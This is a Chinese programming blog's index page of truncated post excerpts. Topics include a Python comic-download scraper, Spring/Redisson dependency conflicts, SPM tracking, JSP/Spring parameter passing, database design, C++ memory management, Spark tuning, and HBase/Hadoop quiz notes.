文章目录 原标题：运用Python多线程爬虫下载漫画 1.怎样实现 1.1 爬取我们需要的数据(网页链接、漫画名称、漫画章节名称) 2.完整代码3.总结 1.怎样实现 这个项目需要的模块有：requests、urllib、threading、os、sys
其中requests模块也可以不用，只要urllib模块即可，但我觉得requests模块爬取数据代码量少。
os模块主要是为了创建文件夹，sys主要是为了结束程序（当然，这里我只是判断是否已经存在我即将创建的文件夹，如果存在，我就直接结束程序了，这个位于代码的开头）。
1.1 爬取我们需要的数据(网页链接、漫画名称、漫画章节名称) 我爬取漫画的网址为：漫客栈
我们到搜索栏上输入 一个漫画名称
我输入的是：斗破苍穹，点击搜索，可以看到这个界面：
对这个网址进行分析：https://www.mkzhan.com/search/?keyword={}
大括号代表的内容就是我们输入的漫画名称，我们只要这样组合，就可以得到这个网址：
from urllib import parse _name=input('请输入你想看的漫画:') name_=parse.urlencode({'keyword':_name}) url='https://www.mkzhan.com/search/?{}'.format(name_) 之后，就是对这个网址下面的内容进行爬取了，这个过程很容易，我就不讲了。
我们点击一下其中的一本漫画，来到这个界面
这个网址，需要我们从上一个网址中得到并进行拼接，我们需要得到这个网址下面的漫画所有章节的链接和名称。
我们按F12来到开发者工具：
可以发现这些章节的内容在这个标签下面：
html1=requests.get(url=url1) content1=html1.text soup1=BeautifulSoup(content1,'lxml') str2=soup1.select('ul.chapter__list-box.clearfix.hide')[0] list2=str2.select('li&gt;a') name1=[] href1=[] for str3 in list2: href1.append(str3['data-hreflink']) # 漫画一章的链接 name1.append(str3.get_text().strip()) # 漫画一章的题目,去空格 这样我们就可以得到我们想要的内容了，我们点击其中的一章进入，发现里面只不过是一些图片罢了，我们只需把这些图片下载下来就行了。
代码运行结果：
下载完成之后，会在同一个文件夹下面多出一个文件夹，文件夹的名称为你输入漫画名称，这个文件夹下面会有很多文件夹，这些文件夹的名称是漫画章节的名称。
2.完整代码 import requests from urllib import parse from bs4 import BeautifulSoup import threading import os import sys _name=input('请输入你想看的漫画:') try: os.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f7473ed72656a0b9da93edfa59704f74/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b90ebcd4532703ab24ca416fe670877/" rel="bookmark">
			spring-boot-starter-data-redis和redisson-spring-boot-starter一起使用：ideaj运行不报错，打包后运行报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		spring: redis: host: 192.168.110.16 port: 16379 timeout: 6000 jedis: pool: max-active: 500 max-wait: -1 max-idle: 10 min-idle: 1 redisson: config: singleServerConfig: address: redis://192.168.110.16:16379 database: 1 上图yml配置 pom.xml部分配置 &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.1.RELEASE&lt;/version&gt; &lt;/parent&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.redisson&lt;/groupId&gt; &lt;artifactId&gt;redisson-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.17.7&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.redisson&lt;/groupId&gt; &lt;artifactId&gt;redisson-spring-data-26&lt;/artifactId&gt; &lt;/exclusion&gt;&lt;/exclusions&gt; &lt;/dependency&gt; 报错
nested exception is java.lang.NoClassDefFoundError: org/springframework/data/redis/connection/RedisStreamCommands
查询各种资料，最终找到原因：版本spring boot 和 redsson中的redisson-spring-data
对应关系问题
所以解决办法，maven repository 里面也有说明
表格说明
https://github.com/redisson/redisson/tree/master/redisson-spring-boot-starter
&lt;dependency&gt; &lt;groupId&gt;org.redisson&lt;/groupId&gt; &lt;artifactId&gt;redisson-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.17.7&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3b90ebcd4532703ab24ca416fe670877/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ceb28abc9b4b1e90172e568aae3f3081/" rel="bookmark">
			SPM/SCM 流量跟踪体系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SPM SPM（shopping page mark，导购页面标记） 是淘宝社区电商业务（xTao）为外部合作伙伴（外站）提供的跟踪引导成交效果数据的解决方案
注：也有解释 SPM 为超级位置模型(Super Position Model)，自行理解即可
淘宝官方解释：开放平台-文档中心 (taobao.com)
注：如果大家平时刷 b 站的话，可以看到 b 站也是有 spm，除此之外 b 站还有 vd_source 字段，额外用于统计用户信息，由登录账户访问链接自动生成追加，内部机制我不了解，但是可以理解为用户 ID，所以谨防泄露
问题 首先思考几个问题
1 .如何统计某个页面的 PV（Page View） 呢？ 一种思路是直接统计服务端请求日志（nginx），只要统计该页面的请求数即可。
另一种思路是直接在客户端埋点，当访问到某个页面时，同时向日志服务器发送一条埋点日志，日志服务器处理后拿到 pv。
2 .如何追踪某个页面的来源呢？ 在第一种思路下，分别统计 nginx 日志下该页面请求的 referer 头信息即可。
而第二种思路下，可以在来源里面加上不同的 URL 来源参数进行区分。
3 .请求具体来自来源页的哪个链接呢？ 很显然在第一种思路下已经不能解决这个问题了，所以这个就是 SPM 做的事情，做个更加精细度的埋点，即为每个链接进行编码
介绍 SPM 示例链接： http://detail.tmall.com/item.htm?id=3716461318&amp;&amp;spm=2014.123456789.1.2
其中 spm=2014.123456789.1.2 便 SPM 编码，用来跟踪页面模块位置的编码，标准 spm 编码由 4 段组成，采用 a.b.c.d 的格式（建议全部使用数字），具体如下：
a 代表站点类型，对于 xTao 合作伙伴（外站），a 为固定值，a=2014b 代表外站 ID（即外站所使用的 TOP appkey），比如您的站点使用的 TOP appkey=123456789，则 b=123456789c 代表 b 站点上的频道 ID，比如是外站某个团购频道，某个逛街频道，某个试用频道等d 代表 c 频道上的页面 ID，比如是某个团购详情页，某个宝贝详情页，某个试用详情页等 完整的 SPM 四位编码能标识出某网站中某一个频道的某一个具体页面
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ceb28abc9b4b1e90172e568aae3f3081/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a6547d5fc02cbea72d8e1e414de1022c/" rel="bookmark">
			Spring 向页面传值以及接受页面传过来的参数的方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、从页面接收参数
Spring MVC接收请求提交的参数值的几种方法：
使用HttpServletRequest获取。 @RequestMapping("/login.do") public String login(HttpServletRequest request){ String name = request.getParameter("name") String pass = request.getParameter("pass") } 使用@RequestParam注解。 @RequestMapping("/login.do") public String login(HttpServletRequest request, String name, @RequestParam("pass")String password) // 表单属性是pass,用变量password接收 { syso(name); syso(password) } 使用自动机制封装成实体参数 &lt;form action="login.do"&gt; 用户名：&lt;input name="name"/&gt; 密码：&lt;input name="pass"/&gt; &lt;input type="submit" value="登陆"&gt; &lt;/form&gt; //封装的User类 public class User{ private String name; private String pass; } @RequestMapping("/login.do") public String login(User user) { syso(user.getName()); syso(user.getPass()); } 二、向页面传值
当Controller组件处理后，需要向响应JSP传值时，可以使用的方法:
1)，使用HttpServletRequest 和 Session 然后setAttribute()，就和Servlet中一样
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a6547d5fc02cbea72d8e1e414de1022c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6fdad3e5fd197466cf3660e123d35dea/" rel="bookmark">
			jsp页面之间传值的一些问题总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在http协议中一共有4种方法来完成这件事情：
1）url传值
2）表单传值
3）Cookie方法
4）Session方法
1、URL传值
将页面1中的值传给页面2
&lt;body&gt; &lt;% String str="123"; int number=Integer.parseInt(str); %&gt; 该数的平方为：&lt;%=number*number%&gt;&lt;hr&gt; &lt;a href="index.jsp?number=&lt;%=number%&gt;"&gt;到达index页面&lt;/a&gt; &lt;/body&gt; index页面：
&lt;body&gt; &lt;% //获得number String str=request.getParamter("number"); int number=Integer.parseInt(str); %&gt; 该数字的立方为：&lt;%=number*number*number%&gt;&lt;hr&gt; &lt;/body&gt; 页面显示效果：
优点：简单性和平台支持的多样性（没有浏览器不支持url）
缺点：
1）传输的数据只能是字符串，对数据类型具有一定的限制
2）传输数据的值会在浏览器地址栏里面被看到，从保密的角度讲，这是不安全的。特别是秘密性要求比较严格的数据，如密码
2、表单传值
方法一中通过url传的值会被看到，为了避免这个问题，我们可以使用表单将页面1中的变量传给页面2
&lt;body&gt; &lt;% String str="10"; int number=Integer.parseInt(str); %&gt; 该数的平方为：&lt;%=number*number%&gt;&lt;hr&gt; &lt;form action="index.jsp" method="post"&gt; &lt;input type="text" name="number" value="&lt;%=number%&gt;"&gt; &lt;input type="submit" value="到达index页面"&gt; &lt;/form&gt; &lt;/body&gt; index.jsp页面：
&lt;body&gt; &lt;% //获得number String str=request.getParameter("number"); int number=Integer.parseInt(str); %&gt; 该数字的立方为：&lt;%=number*number*number%&gt;&lt;hr&gt; &lt;/bpdy&gt; 页面展示结果：
该方法顺利的进行了值传递，并且无法看到传递的信息，在文本框中如果想要隐藏，将type="text"改为type="hidden"即可实现隐藏
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6fdad3e5fd197466cf3660e123d35dea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f1e50d25087f20e5457ea9498569a11/" rel="bookmark">
			DBS note7 (end)：DB Design
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、前言
二、引言
三、Entity-Relationship Models（实体-关系模型）
1、关系约束
三、函数依赖和正则化
1、BCNF分解
2、无损分解
3、依赖关系保留分解
一、前言 略读过一遍CS186，对于CS186来说，绝对不止这 7 篇笔记（包括这一篇）中呈现的内容，我把我的note 7作为该课程的收尾笔记是因为我目前深究课程里面的部分内容性价比不高，我要把精力花在刀刃上，另一原因是我还没有找到比较好的学习数据库的节奏和方法，这7篇note不是结束，只是开始，虽说没有给我带来很多硬核知识上的领悟，但这给我方向上的指引，日后遇到类似知识，可以在博客进行修订补充，不管怎么说，跌跌撞撞前进总比没有前进来得好。结束这一篇note后，下一篇就是新开课程学习著名神课15-445。下面言归正传。
二、引言 到目前为止，我们已经学会了如何使用已经构建好的数据库：SQL查询。但是，如果我们获得了有关我们想要存储的数据的高级描述，我们该怎么设计一个能满足我们需求的数据库呢？
三、Entity-Relationship Models（实体-关系模型） 在设计数据库时，我们经常使用实体-关系模型（也称为 “E-R” 模型）。这些模型有两个主要组成部分。
第一个主要组成部分是实体：由一组属性值描述的现实世界对象。
在我们的 E-R 模型中，实体通常表示为一个矩形。
此外，与实体关联的属性/字段被描绘为椭圆形。
例如，以下图示显示了员工作为实体在我们的 E-R 模型中，具有以下字段：SSN 号码、姓名和其他信息。请注意，“ssn”属性被加下划线，因为它是该实体的识别属性！在模式中，这将是主键。
第二个主要组成部分是关系：两个或多个实体之间的关联。
在我们的 E-R 模型中，关系通常表示为一个菱形。同样，与关系相关的属性被描绘为椭圆形。例如，以下图示显示了员工和部门之间的 “works in” 关系。"works in" 关系具有属性 "since"。
请注意，相同的实体集可以参与不同的关系集，或者在同一个关系集中扮演不同的 “角色”。
1、关系约束 到目前为止，我们一直用一条细黑线将我们的实体连接到关系。这条线表示多对多的关系。这意味着每个实体可以在关系中参与0次或多次，反之亦然。
例如，对于上面的图表，这意味着许多员工可以在许多部门工作（0次或多次），而部门可以有许多员工（0次或多次）。
相比之下，我们希望我们的模型反映每个部门至多有一个经理。我们通过使用 “键约束” 来实现这一点，该约束表示最多有一个，或者是一对多的关系。键约束由细箭头表示。需要注意箭头的方向，它指向在关系中有 0 或 1 的实体，指向有许多实体的方向。例如，对于以下图表，这意味着每个部门最多有一个经理（0 或 1），而员工可以是许多部门的经理（0 次或多次）。
如果我们希望我们的模型显示每个员工至少在一个部门工作，我们可以使用参与约束，该约束表示至少有一个关系。参与约束由一条粗线表示。例如，在下图中，我们添加了两条粗线。其中一条表示每个员工至少在一个部门工作。另一条表示每个部门至少有一个员工。
此外，可以看到我们添加了一条从部门指向管理者的粗箭头。这既是一个键约束，也是一个参与约束：每个部门恰好有一个经理。
弱实体只能通过考虑另一个（所有者）实体的主键来唯一标识。所有者实体和弱实体必须参与一对多的关系（一个所有者，多个弱实体）。弱实体必须在这个识别关系集中具有总参与度。我们通过加粗矩形和关系来表示弱实体，如下所示。此外，弱实体只有一个 “部分键”（虚线下划线）。在下面的示例中，我们说每个依赖项都通过其 pname 和员工的 ssn 唯一标识，并且每个员工都有 0 个或更多个附属项。
现在我们已经绘制出了我们的 E-R 模型，那么我们如何将其实际组织成关系呢？我们可以将每个实体和关系转化为自己的表，并根据表之间的关系设置主键和外键。一般来说，有很多种方法可以设置关系来表示相同的 E-R 模型。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7f1e50d25087f20e5457ea9498569a11/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1525e6d36985e30b404d3b96e15fc338/" rel="bookmark">
			华容道求解可视化工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景 不少宝妈反馈说看不懂程序，希望出一个可视化的求解工具，今天，他来了。
网址 https://bingling_ice-cream.gitee.io/bl-huarongdao/ 华容道求解可视化工具
由于是面向非编程人员的项目，这里就不多赘述了，有问题请留言。 注意 请使用手机打开，或者电脑打开后按一下F12，因为这是手机适应界面。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e6260ed35d8fb5f42280acf5fe04d15/" rel="bookmark">
			C/C&#43;&#43;内存管理(new&amp;&amp;delete)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C/C++内存管理 new&amp;&amp;delete 1.内存的区域划分2.C语言中动态内存管理方式：malloc/calloc/realloc/free2.1 malloc2.2calloc2.3realloc2.4 free 3. C++内存管理方式3.1new/delete操作内置类型3.2 operator new与operator delete函数 4.new和delete的实现原理4.1内置类型4.2自定义类型 5.定位new表达式6.常见的面试题6.1malloc/free和new/delete的区别6.2内存泄漏6.3内存泄漏分类6.4如何避免内存泄漏 1.内存的区域划分 【说明】
栈又叫堆栈–非静态局部变量/函数参数/返回值等等，栈是向下增长的。（局部变量储存在这里）内存映射段是高效的I/O映射方式，用于装载一个共享的动态内存库。用户可使用系统接口 创建共享共享内存，做进程间通信。（Linux课程如果没学到这块，现在只需要了解一下）堆用于程序运行时动态内存分配，堆是可以上增长的。（动态开辟的变量储存在这里）数据段（静态区）–存储全局数据和静态数据。代码段（常量区）–可执行的代码/只读常量。 2.C语言中动态内存管理方式：malloc/calloc/realloc/free 2.1 malloc C语言提供了一个动态内存开辟的函数：
void* malloc (size_t size); 这个函数向内存申请一块连续可用的空间，并返回指向这块空间的指针。 如果开辟成功，则返回一个指向开辟好空间的指针。
如果开辟失败，则返回一个NULL指针，因此malloc的返回值一定要做检查。
返回值的类型是 void* ，所以malloc函数并不知道开辟空间的类型，具体在使用的时候使用者自己 来决定。(强转成指针的类型) 如果参数 size 为0，malloc的行为是标准是未定义的，取决于编译器。 2.2calloc C语言还提供了一个函数叫 calloc ， calloc 函数也用来动态内存分配。原型如下：
void* calloc (size_t num, size_t size); 函数的功能是为 num 个大小为 size 的元素开辟一块空间，并且把空间的每个字节初始化为0。 与函数 malloc 的区别只在于 calloc 会在返回地址之前把申请的空间的每个字节初始化为全0。 2.3realloc realloc函数的出现让动态内存管理更加灵活。
有时会我们发现过去申请的空间太小了，有时候我们又会觉得申请的空间过大了，那为了合理的时 候内存，我们一定会对内存的大小做灵活的调整。那么realloc 函数就可以做到对动态开辟内存大小的调整。
函数原型如下：
void* realloc (void* ptr, size_t size); ptr 是要调整的内存地址size 调整之后新大小返回值为调整之后的内存起始位置。这个函数调整原内存空间大小的基础上，还会将原来内存中的数据移动到 新 的空间。realloc在调整内存空间的是存在两种情况： 情况1：原有空间之后有足够大的空间
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5e6260ed35d8fb5f42280acf5fe04d15/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9b3fe636081d96b021b61481ce52411/" rel="bookmark">
			线上学习51单片机最全教程（只需要一台电脑）！！！第一关：点亮第一个led灯
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前大一学习过51单片机，不仅发现硬件不能时时刻刻带在身上，而且发现不熟悉硬件就去学习51单片机，不能够很好的理解学习51单片机的内核。所以我打算做下这个教程，以便后面的同学能够更好的学习单片机。（本人是一名普通的大学生，不能够做到完美，如果有错误，希望大家指出，谢谢）。
大家在学习51单片机的过程可能会感觉比较枯燥，所以我们可以将整个的学习过程看作一个打怪升级的过程，每次完成一关就可以留下评论一起加油呀！接下来我们一起进入第一关。
软件方面 首先，我们需要安装软件——keil5。这个软件的安装教程随处可找，所以在这里我就不赘述了。
安装完软件之后，我们开始建立一个新的工程。
新建完工程之后，我们开始建立main.c文件，程序主要写在这个文件里面。
到此为止，我们已经完成了第一个程序——点亮第一个led灯。
硬件方面 在硬件方面，我们还需要下载一个软件——Proteus 8 Professional。这个软件的安装教程也可找，所以在这里我也不赘述了。打开软件之后，新建一个工程
在工程里面，寻找和放置所需要的器件。
放置网络标签是这里面的难点，初学者可能不理解这个，其实他就是一个媒介，连接两个器件的端点，隐藏了他们之间的线，使整个电路不乱。 下载程序 放置完所有器件之后，开始将程序下载到硬件中，观察现象。
到此为止，你已经成功打下学习51单片机的第一关!!!
接下来，我们将进入第二个。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/749c3966f54a168e52e4f6e1bba58f31/" rel="bookmark">
			Spark--优化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Spark--优化 总结：优化方向RDD/代码调优1.尽可能复用RDD2.保证对一个RDD执行多次算子操作时，这个RDD本身仅仅被计算一次。3.尽量避免使用shuffle类算子4.使用高性能的算子5.广播变量 参数调优1.num-executors →==executors数量==2.executor-memory→==executors内存==3.executor-cores→==executors核数==4.driver-memory →==driver端的内存==5,spark.default.parallelism →`每个stage的默认task数量`6.spark.storage.memoryFraction→==rdd持久化占内存比例==7.spark.shuffle.memoryFraction→==聚合所占比例== 0.spark程序的执行流程1.关于RDD的相关调优1.避免创建重复的RDD2.尽可能复用同一个RDD3.对多次使用的RDD进行持久化4.尽量避免使用shuffle类算子5.使用map-side预聚合的shuffle操作6.使用高性能的算子使用reduceByKey/aggregateByKey替代groupByKey使用mapPartitions替代普通map使用foreachPartitions替代foreach使用filter之后进行coalesce操作使用repartitionAndSortWithinPartitions替代repartition与sort类操作 7.广播变量 2.资源参数调优1.num-executors →==executors数量==2.executor-memory→==executors内存==3.executor-cores→==executors核数==4.driver-memory →==driver端的内存==5,spark.default.parallelism →`每个stage的默认task数量`6.spark.storage.memoryFraction→==rdd持久化占内存比例==7.spark.shuffle.memoryFraction→==聚合所占比例== 总结：优化方向 RDD/代码调优 1.尽可能复用RDD 避免创建重复的RDD尽可能复用同一个RDD 2.保证对一个RDD执行多次算子操作时，这个RDD本身仅仅被计算一次。 对多次使用的RDD进行持久化。 3.尽量避免使用shuffle类算子 涉及到宽窄依赖的划分涉及到拉取数据能避免则尽可能避免使用reduceByKey、join、distinct、repartition等会进行shuffle的算子，尽量使用map类的非shuffle算子。reduceByKey代替groupByKey，map进行聚合，减少数据传输 4.使用高性能的算子 使用reduceByKey/aggregateByKey替代groupByKey使用mapPartitions替代普通map使用foreachPartitions替代foreach使用filter之后进行coalesce操作 5.广播变量 相当于在每个executor中只驻留一份变量副本，task共享，不需要在去driver端拉取，减少数据传输。 参数调优 1.num-executors →executors数量 2.executor-memory→executors内存 3.executor-cores→executors核数 4.driver-memory →driver端的内存 5,spark.default.parallelism →每个stage的默认task数量 6.spark.storage.memoryFraction→rdd持久化占内存比例 7.spark.shuffle.memoryFraction→聚合所占比例 0.spark程序的执行流程 1.关于RDD的相关调优 1.避免创建重复的RDD 对于同一份数据，只应该创建一个RDD，不能创建多个RDD来代表同一份数据。 // 需要对名为“hello.txt”的HDFS文件进行一次map操作，再进行一次reduce操作。也就是说，需要对一份数据执行两次算子操作。 // 错误的做法：对于同一份数据执行多次算子操作时，创建多个RDD。 // 这里执行了两次textFile方法，针对同一个HDFS文件，创建了两个RDD出来，然后分别对每个RDD都执行了一个算子操作。 // 这种情况下，Spark需要从HDFS上两次加载hello.txt文件的内容，并创建两个单独的RDD；第二次加载HDFS文件以及创建RDD的性能开销，很明显是白白浪费掉的。 val rdd1 = sc.textFile("hdfs://192.168.0.1:9000/hello.txt") rdd1.map(...) val rdd2 = sc.textFile("hdfs://192.168.0.1:9000/hello.txt") rdd2.reduce(...) // 正确的用法：对于一份数据执行多次算子操作时，只使用一个RDD。 // 这种写法很明显比上一种写法要好多了，因为我们对于同一份数据只创建了一个RDD，然后对这一个RDD执行了多次算子操作。 // 但是要注意到这里为止优化还没有结束，由于rdd1被执行了两次算子操作，第二次执行reduce操作的时候，还会再次从源头处重新计算一次rdd1的数据，因此还是会有重复计算的性能开销。 // 要彻底解决这个问题，必须结合“原则三：对多次使用的RDD进行持久化”，才能保证一个RDD被多次使用时只被计算一次。 val rdd1 = sc.textFile("hdfs://192.168.0.1:9000/hello.txt") rdd1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/749c3966f54a168e52e4f6e1bba58f31/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eb45b1817ca558f909c84d1a18f7f2c6/" rel="bookmark">
			Hbase相关
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Hbase相关 1.HBase 来源于哪篇博文？2. 下面对 HBase 的描述哪些是正确的？3.HBase 依靠（）存储底层数据4. HBase 依赖（）提供消息通信机制5.HBase 依赖（）提供强大的计算能力6. MapReduce 与 HBase 的关系，哪些描述是正确的？7.下面哪些选项正确描述了HBase 的特性？8.下面哪些概念是 HBase 框架中使用的？9. LSM 含义是?10.下面对 LSM 结构描述正确的是？ A、C11.LSM 更能保证哪种操作的性能？B12.LSM 的读操作和写操作是独立的？A13.LSM 结构的数据首先存储在（）。 B14.HFile 数据格式中的 Data 字段用于（）。A15.HFile 数据格式中的 MetaIndex 字段用于（）。D16.HFile 数据格式中的 Magic 字段用于（）。A17. HFile 数据格式中的 KeyValue 数据格式，下列选项描述正确的是（）。A、D18.HFile 数据格式中的 KeyValue 数据格式中 Value 部分是（）。C19. HBase 中的批量加载底层使用（）实现。A20.HBase 性能优化包含下面的哪些选项？A、B、C、D21.Rowkey 设计的原则，下列哪些选项的描述是正确的？A、B、C22.HBase 构建二级索引的实现方式有哪些？ A、B23.关于 HBase 二级索引的描述，哪些是正确的？A、B24.下列关于 Bloom Filter 的描述正确的是？A、C25.HBase 官方版本可以安装在什么操作系统上？A、B、C26.HBase 虚拟分布式模式需要（）个节点？A27.HBase 分布式模式最好需要（）个节点？C28.下列哪些选项是安装 HBase 前所必须安装的？A、B29.解压.tar.gz 结尾的 HBase 压缩包使用的 Linux 命令是？A30.HBase 的特点是什么？31.HBase 和 Hive 的区别详解？两者是什么？两者的特点限制应⽤场景总结 32.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eb45b1817ca558f909c84d1a18f7f2c6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8682d517ad9cd22d4681e020bd23c469/" rel="bookmark">
			Doris--数据表建表语法&amp;数据划分（分区&amp;分桶）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.doris表建表语法2.建表示例Range PartitionList Partition 3.数据划分3.1列定义3.2分区与分桶3.2.1Partition3.2.1.1Range 分区3.2.1.2 List 分区 3.2.2Bucket3.2.3 使用复合分区的场景3.2.4 多列分区 3.3PROPERTIES3.4ENGINE3.4其他 1.doris表建表语法 使用 CREATE TABLE 命令建立一个表(Table)。更多详细参数可以查看： help create table; 建表语法： CREATE [EXTERNAL] TABLE [IF NOT EXISTS] [database.]table_name (column_definition1[, column_definition2, ...] [, index_definition1[, index_definition12,]]) [ENGINE = [olap|mysql|broker|hive]] [key_desc] [COMMENT "table comment"]; [partition_desc] [distribution_desc] [rollup_index] [PROPERTIES ("key"="value", ...)] [BROKER PROPERTIES ("key"="value", ...)] ; Doris 的建表是一个同步命令，命令返回成功，即表示建表成功。Doris 支持支持单分区和复合分区两种建表方式。 1）单分区：只做 HASH 分布，即只分桶。2）复合分区：既有分区也有分桶 第一级称为 Partition，即分区。用户可以指定某一维度列作为分区列（当前只支持整型和时间类型的列），并指定每个分区的取值范围。第二级称为 Distribution，即分桶。用户可以指定一个或多个维度列以及桶数对数据进行 HASH 分布。 2.建表示例 Range Partition CREATE TABLE IF NOT EXISTS example_db.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8682d517ad9cd22d4681e020bd23c469/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/42c3598948bbbc4c50ac6348336576c1/" rel="bookmark">
			【【Micro Blaze 的 最后补充 与 回顾 】】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Micro Blaze 的 最后补充 与 回顾 Micro Blaze 最小系统
以 MicroBlaze 为核心、LocalMemory（片上存储）为内存，加上传输信息使用的 UART串口就构成了嵌入式最小系统。当程序比较简单时，Local Memory 可以作为程序的运行空间以及存储空间，空间大小可以根据需要设置最小 8KB 到最大 128KB；当程序比较复杂的时候，我们也可以使用片上搭载的外部存储器（如 DDR3）作为程序的运行空间以及存储空间。AXI Interconnect IP 核用于将一个（或多个）AXI 存储器映射的主器件与一个（或多个）存储器映射互联。在这里我们解释一下这个术语——互联（Interconnect）：互联实际上是一个开关，它管理并指挥所连接的 AXI 接口之间的通信。
另外一个想法
其实我们使用的外部 LED 按键都是 我们自己认为是这个东西 它的本质都属于 GPIO 设备
我们通过管脚绑定 让 这个 GPIO 变成独属于 设备的 控制器
详情我们可以看 《正点原子 达芬奇 Micro Blaze 的 第四节 》先看结构框图
这个是整个的 Block Design
接下来 见解 最深的是 第八章
自定义 IP 核-呼吸灯实验
我们来看 系统框图
我们注意到的其实是这个 Breath LED 的 自定义 IP核
我们以这个 AXI 接口为核心 添加了端口 out
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/42c3598948bbbc4c50ac6348336576c1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/019d648e07a81add605880a541a45c46/" rel="bookmark">
			hadoop相关
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		hadoop Hadoop的功能以及模块功能：Hadoop解决的问题模块 下面哪个程序负责 HDFS 数据存储？hdfs 中的 block 默认保存几份？下列哪个程序通常与NameNode 在一个节点启动？HDFS 默认 Block SizeClient 端上传文件的时候下列哪项正确下面与 HDFS 类似的框架是？Ganglia 不仅可以进行监控，也可以进行告警。（正确）Nagios 不可以监控 Hadoop 集群，因为它不提供 Hadoop支持。（错误 ）如果 NameNode 意外终止，SecondaryNameNode 会接替它使集群继续工作。（错误 ）Cloudera CDH 是需要付费使用的。（错误）NameNode 负责管理 metadata，client 端每次读写请求，它都会从磁盘中读取或则会写入 metadata信息并反馈 client 端。（错误）NameNode 本地磁盘保存了 Block 的位置信息。（ 个人认为正确)DataNode 通过长连接与 NameNode 保持通信。错误Hadoop 自身具有严格的权限管理和安全措施保障集群正常运行。（错误）Slave 节点要存储数据，所以它的磁盘越大越好。（错误）hadoop dfsadmin –report 命令用于检测 HDFS 损坏块。（错误）Hadoop 默认调度器策略为 FIFO（正确 ）FIFO：`先进先出`Capacity：容量调度机制Fair：公平调度机制 集群内每个节点都应该配 RAID，这样避免单磁盘损坏，影响整个节点运行。（错误）Hadoop 环境变量中的 HADOOP_HEAPSIZE 用于设置所有 Hadoop 守护线程的内存。它默认是 200 GB。（ 错误）DataNode 首次加入 cluster 的时候，如果 log 中报告不兼容文件版本，那需要 NameNode执行―Hadoopnamenode -format‖操作格式化磁盘。（错误 ）Block Size 是不可以修改的。（错误）Hadoop 支持数据的随机读写。（错）因为 HDFS 有多个副本，所以 NameNode 是不存在单点问题的。（错误 ）Hadoop 是 Java 开发的，所以 MapReduce 只支持 Java 语言编写。（错误 ）每个 map 槽就是一个线程。（错误）Mapreduce 的 input split 就是一个 